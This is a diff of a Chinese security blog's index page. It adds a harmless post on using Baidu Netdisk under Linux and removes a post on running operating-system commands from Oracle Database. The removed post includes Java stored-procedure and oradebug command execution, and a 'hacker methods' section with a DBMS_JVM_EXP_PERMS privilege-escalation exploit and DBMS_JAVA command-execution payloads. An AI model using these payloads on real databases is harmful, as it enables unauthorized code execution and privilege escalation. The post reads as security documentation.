@@ -128,7 +128,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-count">47</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -190,6 +190,84 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/BaiduNetdisk/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="henices">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/03/19/BaiduNetdisk/" class="post-title-link" itemprop="url">Linux 下使用百度网盘</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>百度网盘在国内很大概率是绕不过去，稍大点文件都喜欢用百度网盘给下载地址。可是百度网盘下载<br>是限速的，而且对 Linux 用户非常不友好，我的 Fedora 装上 rpm 包也用不了，直接崩溃，所以得想点其他办法。</p>
+<h3 id="1-官方安装包-（不一定都能使用）"><a href="#1-官方安装包-（不一定都能使用）" class="headerlink" title="1. 官方安装包 （不一定都能使用）"></a>1. 官方安装包 （不一定都能使用）</h3><p>官方提供了 deb 和 rpm 格式安装包</p>
+<p><a target="_blank" rel="noopener" href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.rpm</a><br><a target="_blank" rel="noopener" href="http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb">http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/3.0.1/baidunetdisk_linux_3.0.1.2.deb</a></p>
+<p>但是在 Fedora 安装后，会报错误。</p>
+<h3 id="2-BaiduPCS-Go-（百度网盘客户端-Go语言编写）"><a href="#2-BaiduPCS-Go-（百度网盘客户端-Go语言编写）" class="headerlink" title="2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）"></a>2. BaiduPCS-Go （百度网盘客户端 - Go语言编写）</h3><p><a target="_blank" rel="noopener" href="https://github.com/iikira/BaiduPCS-Go">https://github.com/iikira/BaiduPCS-Go</a></p>
+<h4 id="2-1-登录"><a href="#2-1-登录" class="headerlink" title="2.1 登录"></a>2.1 登录</h4><p>./BaiduPCS-Go login -bduss=xxxxx</p>
+<h4 id="2-2-设置并发"><a href="#2-2-设置并发" class="headerlink" title="2.2 设置并发"></a>2.2 设置并发</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; config set -max_parallel=50</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3-下载"><a href="#2-3-下载" class="headerlink" title="2.3 下载"></a>2.3 下载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; download xxxxx</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-使用浏览器插件"><a href="#3-使用浏览器插件" class="headerlink" title="3. 使用浏览器插件"></a>3. 使用浏览器插件</h3><p><a target="_blank" rel="noopener" href="https://github.com/acgotaku/BaiduExporter.git">https://github.com/acgotaku/BaiduExporter.git</a></p>
+<p>可以直接使用作者提供的打包好的插件, 直接安装即可。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx">https://github.com/acgotaku/BaiduExporter/blob/master/BaiduExporter.crx</a></p>
+<p>这个插件将使用 aria2c 下载，使用得先准备一个可以使用的aria2c<br>要让 aria2c 更好用一些，可以修改一下配置，配置文件可以参考</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf">https://raw.githubusercontent.com/acgotaku/BaiduExporter/master/aria2c/aria2.conf</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1084,141 +1162,6 @@
 <p>给http响应报文的头部添加一个 newheader 的字段。</p>
 <h2 id="6-socks-模式"><a href="#6-socks-模式" class="headerlink" title="6. socks 模式"></a>6. socks 模式</h2><p>–socks 作为 SOCKS5 proxy server</p>
 <h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>这里说到的内容非常少，mitmproxy这个工具还是很强大的。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/oracle_run_os_cmd/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="henices">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/oracle_run_os_cmd/" class="post-title-link" itemprop="url">Execute os command in Oracle Database</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="1-正统方法"><a href="#1-正统方法" class="headerlink" title="1. 正统方法"></a>1. 正统方法</h2><h3 id="1-1-使用JAVA"><a href="#1-1-使用JAVA" class="headerlink" title="1.1 使用JAVA"></a>1.1 使用JAVA</h3><h4 id="1-1-1-代码"><a href="#1-1-1-代码" class="headerlink" title="1.1.1 代码"></a>1.1.1 代码</h4><p>Oracle 数据库都支持Java，可以利用java来实现我们需要的功能。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED <span class="string">&quot;JAVACMD&quot;</span> AS</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JAVACMD</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">execCommand</span> <span class="params">(String command)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] finalCommand;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="string">&quot;windows&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> String[<span class="number">4</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">&quot;C:\\windows\\system32\\cmd.exe&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">&quot;/y&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">3</span>] = command;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            finalCommand = <span class="keyword">new</span> String[<span class="number">3</span>];</span><br><span class="line">            finalCommand[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            finalCommand[<span class="number">2</span>] = command;</span><br><span class="line">        &#125;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(finalCommand);</span><br><span class="line">        <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">               System.err.println(<span class="string">&quot;command execute failed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">            System.out.println(lineStr);</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="function">CREATE OR REPLACE PROCEDURE <span class="title">JAVACMDPROC</span> <span class="params">(p_command IN VARCHAR2)</span></span></span><br><span class="line"><span class="function">AS LANGUAGE JAVA</span></span><br><span class="line"><span class="function">NAME &#x27;JAVACMD.<span class="title">execCommand</span> <span class="params">(java.lang.String)</span>&#x27;</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-1-2-设置输出"><a href="#1-1-2-设置输出" class="headerlink" title="1.1.2 设置输出"></a>1.1.2 设置输出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> serveroutput <span class="keyword">on</span> size <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">exec</span> dbms_java.set_output(<span class="number">100000</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-1-3-需要的权限"><a href="#1-1-3-需要的权限" class="headerlink" title="1.1.3 需要的权限"></a>1.1.3 需要的权限</h4><p>可以使用下面的语句查询相关权限</p>
-<ul>
-<li>用户权限</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_privs;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>JAVA 权限</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dba_java_policy;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_java_policy;</span><br></pre></td></tr></table></figure>
-
-<p>使用java代码执行系统命令需要的权限，可以使用下面语句进行授权：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>,<span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>,<span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-1-4-实验结果"><a href="#1-1-4-实验结果" class="headerlink" title="1.1.4 实验结果"></a>1.1.4 实验结果</h4><p>非常不错支持回显。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">exec</span> javacmdproc(<span class="string">&#x27;/bin/uname -a&#x27;</span>);</span><br><span class="line">Linux localhost.localdomain <span class="number">2.6</span><span class="number">.32</span><span class="number">-100.34</span><span class="number">.1</span>.el6uek.i686 #<span class="number">1</span> SMP Wed May <span class="number">25</span></span><br><span class="line"><span class="number">17</span>:<span class="number">28</span>:<span class="number">36</span> EDT <span class="number">2011</span> i686 i686 i386 GNU<span class="operator">/</span>Linux</span><br><span class="line"></span><br><span class="line">PL<span class="operator">/</span><span class="keyword">SQL</span> <span class="keyword">procedure</span> successfully completed.</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-1-5-注意"><a href="#1-1-5-注意" class="headerlink" title="1.1.5 注意"></a>1.1.5 注意</h4><p>需要使用全路径</p>
-<h3 id="1-2-DBMS-SCHEDULAR"><a href="#1-2-DBMS-SCHEDULAR" class="headerlink" title="1.2 DBMS_SCHEDULAR"></a>1.2 DBMS_SCHEDULAR</h3><h4 id="1-2-1-DBMS-SCHEDULAR-简介"><a href="#1-2-1-DBMS-SCHEDULAR-简介" class="headerlink" title="1.2.1 DBMS_SCHEDULAR 简介"></a>1.2.1 DBMS_SCHEDULAR 简介</h4><p>这个和Windows上的计划任务类似。</p>
-<h4 id="1-2-2-需要的权限"><a href="#1-2-2-需要的权限" class="headerlink" title="1.2.2 需要的权限"></a>1.2.2 需要的权限</h4><ol>
-<li>CREATE JOB</li>
-<li>CREATE EXTERNAL JOB</li>
-<li>EXECUTE on dbms_scheduler (granted to public by default)</li>
-</ol>
-<p><code>grant create job, create external job to scott ;</code></p>
-<h4 id="1-2-3-执行的语句"><a href="#1-2-3-执行的语句" class="headerlink" title="1.2.3 执行的语句"></a>1.2.3 执行的语句</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; <span class="string">&#x27;MyCmd&#x27;</span>,</span><br><span class="line">program_type=&gt; <span class="string">&#x27;EXECUTABLE&#x27;</span>,</span><br><span class="line">-- Use the ampersand to <span class="keyword">break</span> out</span><br><span class="line">program_action =&gt; <span class="string">&#x27;/tmp/a.sh&#x27;</span>,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; <span class="string">&#x27;Run a command using shell metacharacters.&#x27;</span></span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">   program_name=&gt; <span class="string">&#x27;MyCmd&#x27;</span>,</span><br><span class="line">   repeat_interval=&gt; <span class="string">&#x27;FREQ=SECONDLY;INTERVAL=10&#x27;</span>,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; <span class="string">&#x27;Every 10 seconds&#x27;</span>);</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec DBMS_SCHEDULER.RUN_JOB ( job_name=&gt; <span class="string">&#x27;X&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-2-4-注意"><a href="#1-2-4-注意" class="headerlink" title="1.2.4 注意"></a>1.2.4 注意</h4><ol>
-<li>原先使用 || 等 metacharacters 的bug已经修复，只能使用参数</li>
-<li>Windows系统必须开启OracleJobSchedulerSID 服务</li>
-<li>Linux系统上相关文件的权限必须正确</li>
-<li>高版本的Linux，执行的group已经被Oracle将为nobody</li>
-</ol>
-<p>总之这个方法局限行很大，不推荐使用，列在这里只是做一个备忘。</p>
-<h3 id="1-3-使用oradebug"><a href="#1-3-使用oradebug" class="headerlink" title="1.3 使用oradebug"></a>1.3 使用oradebug</h3><ul>
-<li>oradebug 简介<br>oradebug是一个神奇的命令, 能干很多活, 但是Oracle却很少提及，属于undocumented<br>状态，是给oracle的工程师使用的，主要用于调试和性能调优。可以使用 oradebug help<br>命令，查看oradebug的用法</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; oradebug help</span><br><span class="line">HELP           [command]                 Describe one or all commands</span><br><span class="line">SETMYPID                                 Debug current process</span><br><span class="line">SETOSPID       &lt;ospid&gt;                   Set OS pid of process to debug</span><br><span class="line">SETORAPID      &lt;orapid&gt; [&#x27;force&#x27;]        Set Oracle pid of process to debug</span><br><span class="line">SETORAPNAME    &lt;orapname&gt;                Set Oracle process name to debug</span><br><span class="line">SHORT_STACK                              Get abridged OS stack</span><br><span class="line">CURRENT_SQL                              Get current SQL</span><br><span class="line">DUMP           &lt;dump_name&gt; &lt;lvl&gt; [addr]  Invoke named dump</span><br><span class="line">DUMPSGA        [bytes]                   Dump fixed SGA</span><br><span class="line">DUMPLIST                                 Print a list of available dumps</span><br><span class="line">EVENT          &lt;text&gt;                    Set trace event in process</span><br><span class="line">SESSION_EVENT  &lt;text&gt;                    Set trace event in session</span><br><span class="line">DUMPVAR        &lt;p|s|uga&gt; &lt;name&gt; [level]  Print/dump a fixed PGA/SGA/UGA variable</span><br><span class="line">DUMPTYPE       &lt;address&gt; &lt;type&gt; &lt;count&gt;  Print/dump an address with type info</span><br><span class="line">SETVAR         &lt;p|s|uga&gt; &lt;name&gt; &lt;value&gt;  Modify a fixed PGA/SGA/UGA variable</span><br><span class="line">PEEK           &lt;addr&gt; &lt;len&gt; [level]      Print/Dump memory</span><br><span class="line">POKE           &lt;addr&gt; &lt;len&gt; &lt;value&gt;      Modify memory</span><br><span class="line">WAKEUP         &lt;orapid&gt;                  Wake up Oracle process</span><br><span class="line">SUSPEND                                  Suspend execution</span><br><span class="line">RESUME                                   Resume execution</span><br><span class="line">FLUSH                                    Flush pending writes to trace file</span><br><span class="line">CLOSE_TRACE                              Close trace file</span><br><span class="line">TRACEFILE_NAME                           Get name of trace file</span><br><span class="line">LKDEBUG                                  Invoke global enqueue service debugger</span><br><span class="line">NSDBX                                    Invoke CGS name-service debugger</span><br><span class="line">-G             &lt;Inst-List | def | all&gt;   Parallel oradebug command prefix</span><br><span class="line">-R             &lt;Inst-List | def | all&gt;   Parallel oradebug prefix (return output</span><br><span class="line">SETINST        &lt;instance# .. | all&gt;      Set instance list in double quotes</span><br><span class="line">SGATOFILE      &lt;SGA dump dir&gt;         Dump SGA to file; dirname in double quotes</span><br><span class="line">DMPCOWSGA      &lt;SGA dump dir&gt; Dump &amp; map SGA as COW; dirname in double quotes</span><br><span class="line">MAPCOWSGA      &lt;SGA dump dir&gt;         Map SGA as COW; dirname in double quotes</span><br><span class="line">HANGANALYZE    [level] [syslevel]        Analyze system hang</span><br><span class="line">FFBEGIN                                  Flash Freeze the Instance</span><br><span class="line">FFDEREGISTER                             FF deregister instance from cluster</span><br><span class="line">FFTERMINST                               Call exit and terminate instance</span><br><span class="line">FFRESUMEINST                             Resume the flash frozen instance</span><br><span class="line">FFSTATUS                                 Flash freeze status of instance</span><br><span class="line">SKDSTTPCS      &lt;ifname&gt;  &lt;ofname&gt;        Helps translate PCs to names</span><br><span class="line">WATCH          &lt;address&gt; &lt;len&gt; &lt;self|exist|all|target&gt;  Watch a region of memory</span><br><span class="line">DELETE         &lt;local|global|target&gt; watchpoint &lt;id&gt;    Delete a watchpoint</span><br><span class="line">SHOW           &lt;local|global|target&gt; watchpoints        Show  watchpoints</span><br><span class="line">DIRECT_ACCESS  &lt;set/enable/disable command | select query&gt; Fixed table access</span><br><span class="line">CORE                                     Dump core without crashing process</span><br><span class="line">IPC                                      Dump ipc information</span><br><span class="line">UNLIMIT                                  Unlimit the size of the trace file</span><br><span class="line">PROCSTAT                                 Dump process statistics</span><br><span class="line">CALL           [-t count] &lt;func&gt; [arg1]...[argn]  Invoke function with arguments</span><br></pre></td></tr></table></figure>
-
-<p>功能非常丰富， 下面我们用到的是 CALL 可以直接调用oracle进程使用的函数。</p>
-<h4 id="执行的语句"><a href="#执行的语句" class="headerlink" title="执行的语句"></a>执行的语句</h4><p><code>oradebug setmypid; oradebug call system &quot;/usr/bin/whoami      &gt;/tmp/ret&quot;;</code></p>
-<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
-<li>这里权限要求是SYSDBA</li>
-<li>双引号里必须是使用TAB而不能使用空格</li>
-<li>Linux 和 Windows 下的ORACLE都能利用成功</li>
-</ol>
-<h2 id="2-黑客方法"><a href="#2-黑客方法" class="headerlink" title="2. 黑客方法"></a>2. 黑客方法</h2><p>下面用到的两个方法是David Litchfield 在Blackhat DC 2010 上公开两个方法,通过逆向<br>发现。结合DBMS_JVM_EXP_PERMS的漏洞可以直接执行系统命令(DBMS_JVM_EXP_PERMS 漏洞<br>已经被被修复)</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;</span><br><span class="line">CURSOR C1 IS SELECT ‘GRANT’,USER(), ‘SYS’,<span class="string">&#x27;java.io.FilePermission’,’&lt;&lt;ALL FILES&gt;&gt;‘,’execute’,&#x27;</span>ENABLED’ from dual;</span><br><span class="line">BEGIN</span><br><span class="line">OPEN C1;</span><br><span class="line">FETCH C1 BULK COLLECT INTO POL;</span><br><span class="line">CLOSE C1;</span><br><span class="line">DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>
-
-<p>在有漏洞的DBMS_JVM_EXP_PERMS package的Oracle上执行上述语句，有create session<br>权限的用户可以给自己授权所有java 权限。</p>
-<h3 id="2-1-DBMS-JAVA-TEST-FUNCALL"><a href="#2-1-DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="2.1 DBMS_JAVA_TEST.FUNCALL"></a>2.1 DBMS_JAVA_TEST.FUNCALL</h3><h4 id="2-1-1-执行的语句"><a href="#2-1-1-执行的语句" class="headerlink" title="2.1.1 执行的语句"></a>2.1.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">&#x27;oracle/aurora/util/Wrapper&#x27;</span>,<span class="string">&#x27;main&#x27;</span>,<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;/bin/ls&gt;/tmp/OUT2.LST&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-1-2-需要的权限"><a href="#2-1-2-需要的权限" class="headerlink" title="2.1.2 需要的权限"></a>2.1.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-1-3-受影响系统"><a href="#2-1-3-受影响系统" class="headerlink" title="2.1.3 受影响系统"></a>2.1.3 受影响系统</h4><p>11g R1, 11g R2</p>
-<h3 id="2-2-DBMS-JAVA-RUNJAVA"><a href="#2-2-DBMS-JAVA-RUNJAVA" class="headerlink" title="2.2 DBMS_JAVA.RUNJAVA"></a>2.2 DBMS_JAVA.RUNJAVA</h3><h4 id="2-2-1-执行的语句"><a href="#2-2-1-执行的语句" class="headerlink" title="2.2.1 执行的语句"></a>2.2.1 执行的语句</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DBMS_JAVA.RUNJAVA(<span class="string">&#x27;oracle/aurora/util/Wrapper /bin/bash -c /bin/ls&gt;/tmp/OUT.LST&#x27;</span>) <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-2-2-需要的权限"><a href="#2-2-2-需要的权限" class="headerlink" title="2.2.2 需要的权限"></a>2.2.2 需要的权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> dbms_java.grant_permission(<span class="string">&#x27;SCOTT&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>,<span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>,<span class="string">&#x27;execute&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-2-3-受影响系统"><a href="#2-2-3-受影响系统" class="headerlink" title="2.2.3 受影响系统"></a>2.2.3 受影响系统</h4><p>10g R2, 11g R1, 11g R2</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
-<li><a target="_blank" rel="noopener" href="http://www.orafaq.com/scripts/plsql/oscmd.txt">Using Java to run os command</a></li>
-<li><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B28359_01/server.111/b28310/scheduse002.htm#CHDIDGAE">DBMS_SCHEDULER</a></li>
